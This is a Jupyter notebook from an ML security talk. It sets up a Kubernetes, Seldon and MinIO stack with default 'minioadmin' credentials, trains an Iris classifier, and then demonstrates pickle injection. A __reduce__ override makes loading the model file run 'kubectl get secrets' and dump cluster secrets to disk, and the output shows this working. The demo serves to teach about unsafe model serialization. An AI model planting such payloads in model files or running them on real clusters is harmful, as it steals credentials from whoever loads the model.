{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "6710474f",
   "metadata": {},
   "source": [
    "[![Maintenance](https://img.shields.io/badge/Maintained%3F-YES-green.svg)](https://github.com/EthicalML/awesome-production-machine-learning/graphs/commit-activity)\n",
    "![GitHub](https://img.shields.io/badge/Release-PROD-yellow.svg)\n",
    "![GitHub](https://img.shields.io/badge/Languages-MULTI-blue.svg)\n",
    "![GitHub](https://img.shields.io/badge/License-MIT-lightgrey.svg)\n",
    "[![GitHub](https://img.shields.io/twitter/follow/axsaucedo.svg?label=Follow)](https://twitter.com/AxSaucedo/)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b1a89461",
   "metadata": {},
   "source": [
    "\n",
    "<table>\n",
    "<tr>\n",
    "<td width=\"60%\">\n",
    "<h1>Flawed Machine Learning Security</h1>\n",
    "</td>\n",
    "<td>\n",
    "<a href=\"https://youtu.be/dKjCWfuvYxQ?t=147\"><img src=\"images/bosstown.gif\"></a> <br> (AKA Exploring Secure ML)\n",
    "</td>\n",
    "</td>\n",
    "</table>\n",
    "\n",
    "\n",
    "## About this repo\n",
    "\n",
    "This Repo contains a set of resources relevant to the talk \"Secure Machine Learning at Scale with MLSecOps\", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3828e09c",
   "metadata": {},
   "source": [
    "\n",
    "## Quick links to sections in this page [TODO]\n",
    "\n",
    "| | | |\n",
    "|-|-|-|\n",
    "|[🔍 High Level Frameworks & Principles](#high-level-frameworks-and-principles) |[🔏 Processes & Checklists](#processes-and-checklists) | [🔨 Interactive & Practical Tools](#interactive-and-practical-tools)|\n",
    "|[📜 Industry standards initiatives](#industry-standards-initiatives)|[📚 Online Courses](#online-courses-and-learning-resources)|[🤖 Research and Industry Newsletters](#research-and-industry-newsletters)|\n",
    "|[⚔ Regulation and Policy](#regulation-and-policy)|||\n",
    "\n",
    "## Other relevant resources\n",
    "\n",
    "<table>\n",
    "  <tr>\n",
    "    <td width=\"30%\">\n",
    "         You can join the <a href=\"https://ethical.institute/mle.html\">Machine Learning Engineer</a> newsletter. You will receive updates on open source frameworks, tutorials and articles curated by machine learning professionals.\n",
    "    </td>\n",
    "    <td width=\"70%\">\n",
    "        <a href=\"https://ethical.institute/mle.html\"><img src=\"images/mleng.png\"></a>\n",
    "    </td>\n",
    "  </tr>\n",
    "</table>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eaed5f36",
   "metadata": {},
   "source": [
    "## Setup\n",
    "\n",
    "Requirements on CLIs\n",
    "* kubectl\n",
    "* istioctl\n",
    "* mc (minio client)\n",
    "* Kubernetes > 1.18\n",
    "* Python 3.7"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd1e857f",
   "metadata": {},
   "source": [
    "### Setup Kubernetes Cluster"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7d2fe574",
   "metadata": {},
   "source": [
    "#### Install and setup Istio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "595c260d",
   "metadata": {},
   "outputs": [],
   "source": [
    "!istioctl install -y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "57cadf36",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "kubectl apply -n istio-system -f - << END\n",
    "apiVersion: networking.istio.io/v1alpha3\n",
    "kind: Gateway\n",
    "metadata:\n",
    "  name: seldon-gateway\n",
    "spec:\n",
    "  selector:\n",
    "    istio: ingressgateway # use istio default controller\n",
    "  servers:\n",
    "  - port:\n",
    "      number: 80\n",
    "      name: http\n",
    "      protocol: HTTP\n",
    "    hosts:\n",
    "    - \"*\"\n",
    "END"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d92267eb",
   "metadata": {},
   "source": [
    "#### Setup Seldon Core"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0feb8e6",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "kubectl create ns seldon-system\n",
    "helm upgrade --install \\\n",
    "    seldon-core seldon-core-operator \\\n",
    "    --repo https://storage.googleapis.com/seldon-charts  \\\n",
    "    --set usageMetrics.enabled=true --namespace seldon-system \\\n",
    "    --set istio.enabled=\"true\" --set istio.gateway=\"seldon-gateway.istio-system.svc.cluster.local\" \\\n",
    "    --version 1.13.1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d2207138",
   "metadata": {},
   "source": [
    "#### Setup & configure MinIO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "e60f6a77",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"minio\" already exists with the same configuration, skipping\n",
      "NAME: minio\n",
      "LAST DEPLOYED: Sun Apr 10 13:24:52 2022\n",
      "NAMESPACE: minio-system\n",
      "STATUS: deployed\n",
      "REVISION: 1\n",
      "TEST SUITE: None\n",
      "NOTES:\n",
      "Minio can be accessed via port 9000 on the following DNS name from within your cluster:\n",
      "minio.minio-system.svc.cluster.local\n",
      "\n",
      "To access Minio from localhost, run the below commands:\n",
      "\n",
      "  1. export POD_NAME=$(kubectl get pods --namespace minio-system -l \"release=minio\" -o jsonpath=\"{.items[0].metadata.name}\")\n",
      "\n",
      "  2. kubectl port-forward $POD_NAME 9000 --namespace minio-system\n",
      "\n",
      "Read more about port forwarding here: http://kubernetes.io/docs/user-guide/kubectl/kubectl_port-forward/\n",
      "\n",
      "You can now access Minio server on http://localhost:9000. Follow the below steps to connect to Minio server with mc client:\n",
      "\n",
      "  1. Download the Minio mc client - https://docs.minio.io/docs/minio-client-quickstart-guide\n",
      "\n",
      "  2. Get the ACCESS_KEY=$(kubectl get secret minio -o jsonpath=\"{.data.accesskey}\" | base64 --decode) and the SECRET_KEY=$(kubectl get secret minio -o jsonpath=\"{.data.secretkey}\" | base64 --decode)\n",
      "\n",
      "  3. mc alias set minio-local http://localhost:9000 \"$ACCESS_KEY\" \"$SECRET_KEY\" --api s3v4\n",
      "\n",
      "  4. mc ls minio-local\n",
      "\n",
      "Alternately, you can use your browser or the Minio SDK to access the server - https://docs.minio.io/categories/17\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Error from server (AlreadyExists): namespaces \"minio-system\" already exists\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl create ns minio-system\n",
    "helm repo add minio https://helm.min.io/\n",
    "helm install minio minio/minio \\\n",
    "    --set accessKey=minioadmin \\\n",
    "    --set secretKey=minioadmin \\\n",
    "    --namespace minio-system"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f06ae0a5",
   "metadata": {},
   "source": [
    "Once minio is runnning you need to open another terminal and run:\n",
    "```\n",
    "kubectl port-forward -n minio-system svc/minio 9000:9000\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "174e00ea",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[m\u001b[32mAdded `minio-seldon` successfully.\u001b[0m\r\n",
      "\u001b[0m"
     ]
    }
   ],
   "source": [
    "!mc config host add minio-seldon http://localhost:9000 minioadmin minioadmin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "42c961d2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret/seldon-init-container-secret created\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl apply -f - << END\n",
    "apiVersion: v1\n",
    "kind: Secret\n",
    "metadata:\n",
    "  name: seldon-init-container-secret\n",
    "type: Opaque\n",
    "stringData:\n",
    "  RCLONE_CONFIG_S3_TYPE: s3\n",
    "  RCLONE_CONFIG_S3_PROVIDER: minio\n",
    "  RCLONE_CONFIG_S3_ACCESS_KEY_ID: minioadmin\n",
    "  RCLONE_CONFIG_S3_SECRET_ACCESS_KEY: minioadmin\n",
    "  RCLONE_CONFIG_S3_ENDPOINT: http://minio.minio-system.svc.cluster.local:9000\n",
    "  RCLONE_CONFIG_S3_ENV_AUTH: \"false\"\n",
    "END"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "109fddac",
   "metadata": {},
   "source": [
    "## Model Training"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "046682e5",
   "metadata": {},
   "source": [
    "#### Install requirements for model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "83075c84",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing requirements.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile requirements.txt\n",
    "seldon_core\n",
    "scikit-learn == 0.24.2\n",
    "numpy >= 1.8.2\n",
    "joblib == 0.16.0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "938c9a8d",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install -r requirements.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a23e6ad3",
   "metadata": {},
   "source": [
    "#### Import datasets to train Iris model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "d0d688c9",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn import datasets\n",
    "\n",
    "iris = datasets.load_iris()\n",
    "X, y = iris.data, iris.target"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5ca6089f",
   "metadata": {},
   "source": [
    "#### Import simple LogsticRegression model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "790abd61",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "\n",
    "model = LogisticRegression(solver=\"liblinear\", multi_class='ovr')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58d5a721",
   "metadata": {},
   "source": [
    "#### Train model with dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "5f98af08",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "LogisticRegression(multi_class='ovr', solver='liblinear')"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.fit(X, y)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e08c2df8",
   "metadata": {},
   "source": [
    "#### Run prediction to test model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "68395012",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "05f784e9",
   "metadata": {},
   "source": [
    "#### Dump model binary with pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "43881270",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['model.joblib']"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import joblib\n",
    "\n",
    "joblib.dump(model, \"model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77b94612",
   "metadata": {},
   "outputs": [],
   "source": [
    "!bat model.joblib"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0cb72dd",
   "metadata": {},
   "source": [
    "## Load Pickle and Inject Malicious Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "786cacd7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_safe = joblib.load(\"model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6b464df0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model_safe.predict(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "87b80b3e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import types, os\n",
    "\n",
    "def __reduce__(self):\n",
    "    cmd = \"kubectl get secrets -o yaml > kubernetes-secrets.txt\"\n",
    "    return os.system, (cmd,)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "ed74851b",
   "metadata": {},
   "outputs": [],
   "source": [
    "model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__class__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "4b29a6fa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['model_unsafe.joblib']"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "joblib.dump(model_safe, \"model_unsafe.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ce58f5c",
   "metadata": {},
   "outputs": [],
   "source": [
    "!bat model_unsafe.joblib"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5ec0ec4b",
   "metadata": {},
   "source": [
    "#### Now reload the insecure pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "1e28c6a2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access 'kubernetes-secrets.txt': No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "!ls kubernetes-secrets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "a65f4635",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_unsafe = joblib.load(\"model_unsafe.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "473c7c1d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "apiVersion: v1\r\n",
      "items:\r\n",
      "- apiVersion: v1\r\n",
      "  data:\r\n"
     ]
    }
   ],
   "source": [
    "!head -4 kubernetes-secrets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6ca73c4",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
